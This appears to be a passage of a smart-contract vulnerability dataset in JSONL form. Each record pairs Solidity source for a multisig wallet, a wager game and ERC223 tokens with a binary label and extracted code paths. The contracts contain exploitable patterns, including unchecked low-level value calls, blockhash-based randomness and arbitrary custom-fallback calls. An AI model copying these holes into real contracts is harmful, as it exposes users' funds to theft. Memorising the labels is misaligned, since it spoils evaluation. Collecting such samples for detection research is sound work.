_required; } function revoke(bytes32 _operation) external { uint ownerIndex = m_ownerIndex[uint(msg.sender)]; if (ownerIndex == 0) return; uint ownerIndexBit = 2**ownerIndex; var pending = m_pending[_operation]; if (pending.ownersDone & ownerIndexBit > 0) { pending.yetNeeded++; pending.ownersDone -= ownerIndexBit; Revoke(msg.sender, _operation); } } function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external { if (isOwner(_to)) return; uint ownerIndex = m_ownerIndex[uint(_from)]; if (ownerIndex == 0) return; clearPending(); m_owners[ownerIndex] = uint(_to); m_ownerIndex[uint(_from)] = 0; m_ownerIndex[uint(_to)] = ownerIndex; OwnerChanged(_from, _to); } function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external { if (isOwner(_owner)) return; clearPending(); if (m_numOwners >= c_maxOwners) reorganizeOwners(); if (m_numOwners >= c_maxOwners) return; m_numOwners++; m_owners[m_numOwners] = uint(_owner); m_ownerIndex[uint(_owner)] = m_numOwners; OwnerAdded(_owner); } function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external { uint ownerIndex = m_ownerIndex[uint(_owner)]; if (ownerIndex == 0) return; if (m_required > m_numOwners - 1) return; m_owners[ownerIndex] = 0; m_ownerIndex[uint(_owner)] = 0; clearPending(); reorganizeOwners(); OwnerRemoved(_owner); } function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external { if (_newRequired > m_numOwners) return; m_required = _newRequired; clearPending(); RequirementChanged(_newRequired); } function getOwner(uint ownerIndex) external constant returns (address) { return address(m_owners[ownerIndex + 1]); } function isOwner(address _addr) constant returns (bool) { return m_ownerIndex[uint(_addr)] > 0; } function hasConfirmed(bytes32 _operation, address _owner) constant returns (bool) { var pending = m_pending[_operation]; uint ownerIndex = m_ownerIndex[uint(_owner)]; if (ownerIndex == 0) return false; uint ownerIndexBit = 2**ownerIndex; return !(pending.ownersDone & ownerIndexBit == 0); } function confirmAndCheck(bytes32 _operation) internal returns (bool) { uint ownerIndex = m_ownerIndex[uint(msg.sender)]; if (ownerIndex == 0) return; var pending = m_pending[_operation]; if (pending.yetNeeded == 0) { pending.yetNeeded = m_required; pending.ownersDone = 0; pending.index = m_pendingIndex.length++; m_pendingIndex[pending.index] = _operation; } uint ownerIndexBit = 2**ownerIndex; if (pending.ownersDone & ownerIndexBit == 0) { Confirmation(msg.sender, _operation); if (pending.yetNeeded <= 1) { delete m_pendingIndex[m_pending[_operation].index]; delete m_pending[_operation]; return true; } else { pending.yetNeeded--; pending.ownersDone |= ownerIndexBit; } } } function reorganizeOwners() private { uint free = 1; while (free < m_numOwners) { while (free < m_numOwners && m_owners[free] != 0) free++; while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--; if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0) { m_owners[free] = m_owners[m_numOwners]; m_ownerIndex[m_owners[free]] = free; m_owners[m_numOwners] = 0; } } } function clearPending() internal { uint length = m_pendingIndex.length; for (uint i = 0; i < length; ++i) if (m_pendingIndex[i] != 0) delete m_pending[m_pendingIndex[i]]; delete m_pendingIndex; } uint public m_required; uint public m_numOwners; uint[256] m_owners; uint constant c_maxOwners = 250; mapping(uint => uint) m_ownerIndex; mapping(bytes32 => PendingState) m_pending; bytes32[] m_pendingIndex; } contract multisig { event Deposit(address _from, uint value); event SingleTransact(address owner, uint value, address to, bytes data); event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data); event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data); function changeOwner(address _from, address _to) external; function execute(address _to, uint _value, bytes _data) external returns (bytes32); function confirm(bytes32 _h) returns (bool); } contract Wallet is multisig, multiowned { struct Transaction { address to; uint value; bytes data; } function Wallet(address[] _owners, uint _required) multiowned(_owners, _required)  { } function() payable{ if (msg.value > 0) Deposit(msg.sender, msg.value); } function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); } } function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data); MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; } } function clearPending() internal { uint length = m_pendingIndex.length; for (uint i = 0; i < length; ++i) delete m_txs[m_pendingIndex[i]]; super.clearPending(); } mapping (bytes32 => Transaction) m_txs; } "}
{"sol name": "1044.sol", "label": 1, "first path": "function donateToWhale(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Donate(amount, whale, msg.sender); function loseWager(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Lose(amount, msg.sender); ", "second path": "function donateToWhale(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Donate(amount, whale, msg.sender); function loseWager(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Lose(amount, msg.sender); ", "third path": "function donateToWhale(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Donate(amount, whale, msg.sender); function loseWager(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Lose(amount, msg.sender); ", "long path": "pragma solidity ^0.4.21; contract PoCGame { modifier onlyOwner() { require(msg.sender == owner); _; } modifier isOpenToPublic() { require(openToPublic); _; } modifier onlyRealPeople() { require (msg.sender == tx.origin); _; } modifier  onlyPlayers() { require (wagers[msg.sender] > 0); _; } event Wager(uint256 amount, address depositer); event Win(uint256 amount, address paidTo); event Lose(uint256 amount, address loser); event Donate(uint256 amount, address paidTo, address donator); event DifficultyChanged(uint256 currentDifficulty); event BetLimitChanged(uint256 currentBetLimit); address private whale; uint256 betLimit; uint difficulty; uint private randomSeed; address owner; mapping(address => uint256) timestamps; mapping(address => uint256) wagers; bool openToPublic; uint256 totalDonated; constructor(address whaleAddress, uint256 wagerLimit) onlyRealPeople() public { openToPublic = false; owner = msg.sender; whale = whaleAddress; totalDonated = 0; betLimit = wagerLimit; } function OpenToThePublic() onlyOwner() public { openToPublic = true; } function AdjustBetAmounts(uint256 amount) onlyOwner() public { betLimit = amount; emit BetLimitChanged(betLimit); } function AdjustDifficulty(uint256 amount) onlyOwner() public { difficulty = amount; emit DifficultyChanged(difficulty); } function() public payable { } function wager()    isOpenToPublic()    onlyRealPeople()     payable    public     { require(msg.value == betLimit); timestamps[msg.sender] = block.number; wagers[msg.sender] = msg.value; emit Wager(msg.value, msg.sender); } function play() isOpenToPublic() onlyRealPeople() onlyPlayers() public { uint256 blockNumber = timestamps[msg.sender]; if(blockNumber < block.number)    { timestamps[msg.sender] = 0; wagers[msg.sender] = 0; uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1; if(winningNumber == difficulty / 2)    { payout(msg.sender); } else  { loseWager(betLimit / 2); } } else   { revert(); } } function donate() isOpenToPublic() public payable { donateToWhale(msg.value); } function payout(address winner) internal { uint256 ethToTransfer = address(this).balance / 2; winner.transfer(ethToTransfer); emit Win(ethToTransfer, winner); } function donateToWhale(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Donate(amount, whale, msg.sender); } function loseWager(uint256 amount) internal { whale.call.value(amount)(bytes4(keccak256(\"donate()\"))); totalDonated += amount; emit Lose(amount, msg.sender); } function ethBalance()     public     view     returns (uint256)    { return address(this).balance; } function currentDifficulty() public  view  returns (uint256) { return difficulty; } function currentBetLimit() public  view  returns (uint256) { return betLimit; } function hasPlayerWagered(address player) public  view  returns (bool) { if(wagers[player] > 0) { return true; } else { return false; } } function winnersPot()  public  view  returns (uint256) { return address(this).balance / 2; } function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)  public onlyOwner() returns (bool success) { return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens); } } contract ERC20Interface { function transfer(address to, uint256 tokens) public returns (bool success); } "}
{"sol name": "17573.sol", "label": 0, "first path": "function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; require(super.transferFrom(_from, _to, _amount)); if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data); ERC223Transfer(_from, _to, _amount, _data); return true; function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  { return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback); ", "second path": "function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; require(super.transferFrom(_from, _to, _amount)); if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data); ERC223Transfer(_from, _to, _amount, _data); return true; function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  { return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback); ", "third path": "function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; require(super.transferFrom(_from, _to, _amount)); if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data); ERC223Transfer(_from, _to, _amount, _data); return true; function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  { return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback); ", "long path": "pragma solidity ^0.4.17; contract DSAuthority { function canCall( address src, address dst, bytes4 sig ) public view returns (bool); } contract DSAuthEvents { event LogSetAuthority (address indexed authority); event LogSetOwner     (address indexed owner); } contract DSAuth is DSAuthEvents { DSAuthority  public  authority; address      public  owner; function DSAuth() public { owner = msg.sender; LogSetOwner(msg.sender); } function setOwner(address owner_) public auth { owner = owner_; LogSetOwner(owner); } function setAuthority(DSAuthority authority_) public auth { authority = authority_; LogSetAuthority(authority); } modifier auth { require(isAuthorized(msg.sender, msg.sig)); _; } function isAuthorized(address src, bytes4 sig) internal view returns (bool) { if (src == address(this)) { return true; } else if (src == owner) { return true; } else if (authority == DSAuthority(0)) { return false; } else { return authority.canCall(src, this, sig); } } } contract DSNote { event LogNote( bytes4   indexed  sig, address  indexed  guy, bytes32  indexed  foo, bytes32  indexed  bar, uint              wad, bytes             fax ) anonymous; modifier note { bytes32 foo; bytes32 bar; assembly { foo := calldataload(4) bar := calldataload(36) } LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data); _; } } contract DSStop is DSNote, DSAuth { bool public stopped; modifier stoppable { require(!stopped); _; } function stop() public auth note { stopped = true; } function start() public auth note { stopped = false; } } contract ERC20 { function totalSupply() public view returns (uint supply); function balanceOf( address who ) public view returns (uint value); function allowance( address owner, address spender ) public view returns (uint _allowance); function transfer( address to, uint value) public returns (bool ok); function transferFrom( address from, address to, uint value) public returns (bool ok); function approve( address spender, uint value ) public returns (bool ok); event Transfer( address indexed from, address indexed to, uint value); event Approval( address indexed owner, address indexed spender, uint value); } contract DSMath { function add(uint x, uint y) internal pure returns (uint z) { require((z = x + y) >= x); } function sub(uint x, uint y) internal pure returns (uint z) { require((z = x - y) <= x); } function mul(uint x, uint y) internal pure returns (uint z) { require(y == 0 || (z = x * y) / y == x); } function min(uint x, uint y) internal pure returns (uint z) { return x <= y ? x : y; } function max(uint x, uint y) internal pure returns (uint z) { return x >= y ? x : y; } function imin(int x, int y) internal pure returns (int z) { return x <= y ? x : y; } function imax(int x, int y) internal pure returns (int z) { return x >= y ? x : y; } uint constant WAD = 10 ** 18; uint constant RAY = 10 ** 27; function wmul(uint x, uint y) internal pure returns (uint z) { z = add(mul(x, y), WAD / 2) / WAD; } function rmul(uint x, uint y) internal pure returns (uint z) { z = add(mul(x, y), RAY / 2) / RAY; } function wdiv(uint x, uint y) internal pure returns (uint z) { z = add(mul(x, WAD), y / 2) / y; } function rdiv(uint x, uint y) internal pure returns (uint z) { z = add(mul(x, RAY), y / 2) / y; } function rpow(uint x, uint n) internal pure returns (uint z) { z = n % 2 != 0 ? x : RAY; for (n /= 2; n != 0; n /= 2) { x = rmul(x, x); if (n % 2 != 0) { z = rmul(z, x); } } } } contract DSTokenBase is ERC20, DSMath { uint256                                            _supply; mapping (address => uint256)                       _balances; mapping (address => mapping (address => uint256))  _approvals; function DSTokenBase(uint supply) public { _balances[msg.sender] = supply; _supply = supply; } function totalSupply() public view returns (uint) { return _supply; } function balanceOf(address src) public view returns (uint) { return _balances[src]; } function allowance(address src, address guy) public view returns (uint) { return _approvals[src][guy]; } function transfer(address dst, uint wad) public returns (bool) { return transferFrom(msg.sender, dst, wad); } function transferFrom(address src, address dst, uint wad) public returns (bool) { if (src != msg.sender) { _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad); } _balances[src] = sub(_balances[src], wad); _balances[dst] = add(_balances[dst], wad); Transfer(src, dst, wad); return true; } function approve(address guy, uint wad) public returns (bool) { _approvals[msg.sender][guy] = wad; Approval(msg.sender, guy, wad); return true; } } contract DSToken is DSTokenBase(0), DSStop { mapping (address => mapping (address => bool)) _trusted; bytes32  public  symbol; uint256  public  decimals = 18; function DSToken(bytes32 symbol_) public { symbol = symbol_; } event Trust(address indexed src, address indexed guy, bool wat); event Mint(address indexed guy, uint wad); event Burn(address indexed guy, uint wad); function trusted(address src, address guy) public view returns (bool) { return _trusted[src][guy]; } function trust(address guy, bool wat) public stoppable { _trusted[msg.sender][guy] = wat; Trust(msg.sender, guy, wat); } function approve(address guy, uint wad) public stoppable returns (bool) { return super.approve(guy, wad); } function transferFrom(address src, address dst, uint wad) public stoppable returns (bool) { if (src != msg.sender && !_trusted[src][msg.sender]) { _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad); } _balances[src] = sub(_balances[src], wad); _balances[dst] = add(_balances[dst], wad); Transfer(src, dst, wad); return true; } function push(address dst, uint wad) public { transferFrom(msg.sender, dst, wad); } function pull(address src, uint wad) public { transferFrom(src, msg.sender, wad); } function move(address src, address dst, uint wad) public { transferFrom(src, dst, wad); } function mint(uint wad) public { mint(msg.sender, wad); } function burn(uint wad) public { burn(msg.sender, wad); } function mint(address guy, uint wad) public auth stoppable { _balances[guy] = add(_balances[guy], wad); _supply = add(_supply, wad); Mint(guy, wad); } function burn(address guy, uint wad) public auth stoppable { if (guy != msg.sender && !_trusted[guy][msg.sender]) { _approvals[guy][msg.sender] = sub(_approvals[guy][msg.sender], wad); } _balances[guy] = sub(_balances[guy], wad); _supply = sub(_supply, wad); Burn(guy, wad); } bytes32   public  name = \"\"; function setName(bytes32 name_) public auth { name = name_; } } contract ERC223ReceivingContract { function tokenFallback(address _from, uint256 _value, bytes _data) public; } contract TokenController { function proxyPayment(address _owner) payable public returns(bool); function onTransfer(address _from, address _to, uint _amount) public returns(bool); function onApprove(address _owner, address _spender, uint _amount) public returns(bool); } contract Controlled { modifier onlyController { if (msg.sender != controller) throw; _; } address public controller; function Controlled() { controller = msg.sender;} function changeController(address _newController) onlyController { controller = _newController; } } contract ApproveAndCallFallBack { function receiveApproval(address from, uint256 _amount, address _token, bytes _data); } contract ERC223 { function transfer(address to, uint amount, bytes data) public returns (bool ok); function transferFrom(address from, address to, uint256 amount, bytes data) public returns (bool ok); function transfer(address to, uint amount, bytes data, string custom_fallback) public returns (bool ok); function transferFrom(address from, address to, uint256 amount, bytes data, string custom_fallback) public returns (bool ok); event ERC223Transfer(address indexed from, address indexed to, uint amount, bytes data); event ReceivingContractTokenFallbackFailed(address indexed from, address indexed to, uint amount); } contract OMT is DSToken(\"OMT\"), ERC223, Controlled { function OMT() { setName(\"OTCMAKER Token\"); } function transferFrom(address _from, address _to, uint256 _amount ) public returns (bool success) { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; } success = super.transferFrom(_from, _to, _amount); if (success && isContract(_to)) { if(!_to.call(bytes4(keccak256(\"tokenFallback(address,uint256)\")), _from, _amount)) { ReceivingContractTokenFallbackFailed(_from, _to, _amount); } } } function transferFrom(address _from, address _to, uint256 _amount, bytes _data) public returns (bool success) { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; } require(super.transferFrom(_from, _to, _amount)); if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.tokenFallback(_from, _amount, _data); } ERC223Transfer(_from, _to, _amount, _data); return true; } function transfer( address _to,  uint256 _amount,     bytes _data)    public   returns (bool success)  { return transferFrom(msg.sender, _to, _amount, _data); } function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; } require(super.transferFrom(_from, _to, _amount)); if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data); } ERC223Transfer(_from, _to, _amount, _data); return true; } function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  { return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback); } function approve(address _spender, uint256 _amount) returns (bool success) { if (isContract(controller)) { if (!TokenController(controller).onApprove(msg.sender, _spender, _amount)) throw; } return super.approve(_spender, _amount); } function mint(address _guy, uint _wad) auth stoppable { super.mint(_guy, _wad); Transfer(0, _guy, _wad); } function burn(address _guy, uint _wad) auth stoppable { super.burn(_guy, _wad); Transfer(_guy, 0, _wad); } function approveAndCall(address _spender, uint256 _amount, bytes _extraData ) returns (bool success) { if (!approve(_spender, _amount)) throw; ApproveAndCallFallBack(_spender).receiveApproval( msg.sender, _amount, this, _extraData ); return true; } function isContract(address _addr) constant internal returns(bool) { uint size; if (_addr == 0) return false; assembly { size := extcodesize(_addr) } return size>0; } function ()  payable { if (isContract(controller)) { if (! TokenController(controller).proxyPayment.value(msg.value)(msg.sender)) throw; } else { throw; } } function claimTokens(address _token) onlyController { if (_token == 0x0) { controller.transfer(this.balance); return; } ERC20 token = ERC20(_token); uint balance = token.balanceOf(this); token.transfer(controller, balance); ClaimedTokens(_token, controller, balance); } event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount); } "}
{"sol name": "17215.sol", "label": 0, "first path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) { require(compatible223ex); require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if (isContract(_to)) { assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; ", "second path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) { require(compatible223ex); require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if (isContract(_to)) { assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; ", "third path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) { require(compatible223ex); require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if (isContract(_to)) { assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract UpgradeAgent { function upgradeFrom(address _from, uint256 _value) external; } contract ERC223Interface { uint public totalSupply; function name() public view returns (string _name); function symbol() public view returns (string _symbol); function decimals() public view returns (uint8 _decimals); function totalSupply() public view returns (uint256 _supply); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint value) public returns (bool ok); function transfer(address to, uint value, bytes data) public returns (bool ok); function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok); event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); } contract ERC20Interface { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function transferFrom(address from, address to, uint256 value, bytes data) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value); } contract ReceivingContract { struct TKN { address sender; uint value; bytes data; bytes4 sig; } function tokenFallback(address _from, uint _value, bytes _data) public pure { TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); } } contract Owned { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); modifier onlyOwner() { require(msg.sender == owner); _; } function Owned() public { owner = msg.sender; } function changeOwner(address _newOwner) public onlyOwner { require(_newOwner != address(0)); OwnershipTransferred(owner, _newOwner); owner = _newOwner; } } contract TORUE is ERC223Interface,ERC20Interface,Owned { using SafeMath for uint; string public name = \"torue\"; string public symbol = \"TRE\"; uint8 public decimals = 6; uint256 public totalSupply = 100e8 * 1e6; mapping (address => uint256) balances; mapping (address => uint256) public lockedAccounts; mapping (address => bool) public frozenAccounts; mapping (address => mapping (address => uint256)) internal allowed; mapping (address => bool) public salvageableAddresses; event Mint(address indexed to, uint256 amount); event MintFinished(); event Burn(address indexed burner, uint256 value); event DistributeTokens(uint count,uint256 totalAmount); event Upgrade(address indexed from, address indexed to, uint256 value); event AccountLocked(address indexed addr, uint256 releaseTime); event AccountFrozen(address indexed addr, bool frozen); address ownerAddress = 0xA0Bf23D5Ef64B6DdEbF5343a3C897c53005ee665; address lockupAddress1 = 0xB3c289934692ECE018d137fFcaB54631e6e2b405; address lockupAddress2 = 0x533c43AF0DDb5ee5215c0139d917F1A871ff9CB5; bool public compatible20 = true; bool public compatible223 = true; bool public compatible223ex = true; bool public mintingFinished = false; bool public salvageFinished = false; bool public paused = false; bool public upgradable = false; bool public upgradeAgentLocked = false; address public upgradeMaster; address public upgradeAgent; uint256 public totalUpgraded; modifier canMint() { require(!mintingFinished); _; } modifier isRunning(){ require(!paused); _; } function TORUE() public { require(msg.sender==ownerAddress); owner = ownerAddress; upgradeMaster = ownerAddress; balances[owner] = totalSupply.mul(70).div(100); balances[lockupAddress1] = totalSupply.mul(15).div(100); balances[lockupAddress2] = totalSupply.mul(15).div(100); paused = false; } function switchCompatible20(bool _value) onlyOwner public { compatible20 = _value; } function switchCompatible223(bool _value) onlyOwner public { compatible223 = _value; } function switchCompatible223ex(bool _value) onlyOwner public { compatible223ex = _value; } function switchPaused(bool _paused) onlyOwner public { paused = _paused; } function switchUpgradable(bool _value) onlyOwner public { upgradable = _value; } function switchUpgradeAgentLocked(bool _value) onlyOwner public { upgradeAgentLocked = _value; } function isUnlocked(address _addr) private view returns (bool){ return(now > lockedAccounts[_addr] && frozenAccounts[_addr] == false); } function isUnlockedBoth(address _addr) private view returns (bool){ return(now > lockedAccounts[msg.sender] && now > lockedAccounts[_addr] && frozenAccounts[msg.sender] == false && frozenAccounts[_addr] == false); } function lockAccounts(address[] _addresses, uint256 _releaseTime) onlyOwner public { require(_addresses.length > 0); for(uint j = 0; j < _addresses.length; j++){ require(lockedAccounts[_addresses[j]] < _releaseTime); lockedAccounts[_addresses[j]] = _releaseTime; AccountLocked(_addresses[j], _releaseTime); } } function freezeAccounts(address[] _addresses, bool _value) onlyOwner public { require(_addresses.length > 0); for (uint j = 0; j < _addresses.length; j++) { require(_addresses[j] != 0x0); frozenAccounts[_addresses[j]] = _value; AccountFrozen(_addresses[j], _value); } } function setSalvageable(address _addr, bool _value) onlyOwner public { salvageableAddresses[_addr] = _value; } function finishSalvage(address _addr) onlyOwner public returns (bool) { require(_addr==owner); salvageFinished = true; return true; } function salvageTokens(address _addr,uint256 _amount) onlyOwner public isRunning returns(bool) { require(_amount > 0 && balances[_addr] >= _amount); require(now > lockedAccounts[msg.sender] && now > lockedAccounts[_addr]); require(salvageableAddresses[_addr] == true && salvageFinished == false); balances[_addr] = balances[_addr].sub(_amount); balances[msg.sender] = balances[msg.sender].add(_amount); Transfer(_addr, msg.sender, _amount); return true; } function approve(address _spender, uint256 _value) public isRunning returns (bool) { require(compatible20); allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256 remaining) { return allowed[_owner][_spender]; } function transferFrom(address _from, address _to, uint256 _value) public isRunning returns (bool) { require(compatible20); require(isUnlocked(_from)); require(isUnlocked(_to)); require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); if(isContract(_to)) { bytes memory empty; ReceivingContract rc = ReceivingContract(_to); rc.tokenFallback(msg.sender, _value, empty); } Transfer(_from, _to, _value); return true; } function transferFrom(address _from, address _to, uint256 _value, bytes _data) public isRunning returns (bool) { require(compatible223); require(isUnlocked(_from)); require(isUnlocked(_to)); require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); if(isContract(_to)) { ReceivingContract rc = ReceivingContract(_to); rc.tokenFallback(msg.sender, _value, _data); } Transfer(msg.sender, _to, _value, _data); Transfer(_from, _to, _value); return true; } function increaseApproval(address _spender, uint _addedValue) public isRunning returns (bool) { require(compatible20); allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public isRunning returns (bool) { require(compatible20); uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function mint(address _to, uint256 _amount) onlyOwner canMint public isRunning returns (bool) { totalSupply = totalSupply.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); Transfer(address(0), _to, _amount); return true; } function finishMinting(address _addr) onlyOwner public returns (bool) { require(_addr==owner); mintingFinished = true; MintFinished(); return true; } function burn(uint256 _value) public isRunning { require(_value > 0); require(_value <= balances[msg.sender]); address burner = msg.sender; balances[burner] = balances[burner].sub(_value); totalSupply = totalSupply.sub(_value); Burn(msg.sender, _value); } function isContract(address _addr) private view returns (bool is_contract) { uint ln; assembly { ln := extcodesize(_addr) } return (ln > 0); } function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) { require(compatible223ex); require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if (isContract(_to)) { assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); } Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } function transfer(address _to, uint _value, bytes _data) public isRunning returns (bool ok) { require(compatible223); require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if(isContract(_to)) { ReceivingContract rc = ReceivingContract(_to); rc.tokenFallback(msg.sender, _value, _data); } Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } function transfer(address _to, uint _value) public isRunning returns (bool ok) { require(isUnlockedBoth(_to)); require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); if(isContract(_to)) { bytes memory empty; ReceivingContract rc = ReceivingContract(_to); rc.tokenFallback(msg.sender, _value, empty); } Transfer(msg.sender, _to, _value); return true; } function name() public view returns (string _name) { return name; } function symbol() public view returns (string _symbol) { return symbol; } function decimals() public view returns (uint8 _decimals) { return decimals; } function totalSupply() public view returns (uint256 _totalSupply) { return totalSupply; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } function distributeTokens(address[] _addresses, uint256 _amount) onlyOwner public isRunning returns(bool) { require(_addresses.length > 0 && isUnlocked(msg.sender)); uint256 totalAmount = _amount.mul(_addresses.length); require(balances[msg.sender] >= totalAmount); for (uint j = 0; j < _addresses.length; j++) { 